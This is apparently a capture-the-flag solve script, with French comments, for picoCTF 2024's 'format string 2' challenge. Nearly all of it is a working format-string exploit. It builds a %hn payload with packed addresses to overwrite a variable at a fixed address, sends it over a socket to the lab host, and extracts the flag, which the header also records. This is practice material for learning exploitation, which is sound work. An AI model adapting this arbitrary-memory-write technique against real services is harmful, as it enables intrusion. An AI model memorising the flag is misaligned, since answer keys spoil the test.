# 448 - format string 2  (Binary Exploitation, picoCTF 2024)
# Flag: academy{f0rm47_57r?_f0rm47_m3m_18b9edd8}
# Write-up: ../../../writeups/binary-exploitation/448-format-string-2.md
# Script exact utilise pour produire le flag.
#
import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 17681
SUS = 0x404048
low = 0x6C66   # 27750
high = 0x6761  # 26465

# ordre croissant : high (26465) puis low (27750)
spec = f"%{high}c%18$hn%{low - high}c%19$hn"
pad = (-len(spec)) % 8
payload = spec.encode() + b"P" * pad
assert len(payload) == 32, len(payload)
payload += struct.pack("<Q", SUS + 2)
payload += struct.pack("<Q", SUS)
print("payload len:", len(payload))
print("spec:", spec, "pad:", pad)
try:
    s = socket.create_connection((HOST, PORT), timeout=12)
    s.settimeout(6)
    time.sleep(0.6)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(payload + b"\n")
    time.sleep(1.5)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass
    txt = out.decode("utf-8", "replace")
    print("=== sortie (tail) ===")
    print(txt[-500:])
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    if m:
        print("FLAG:", m.group(0))
    s.close()
except Exception as e:
    print("err", type(e).__name__, e)
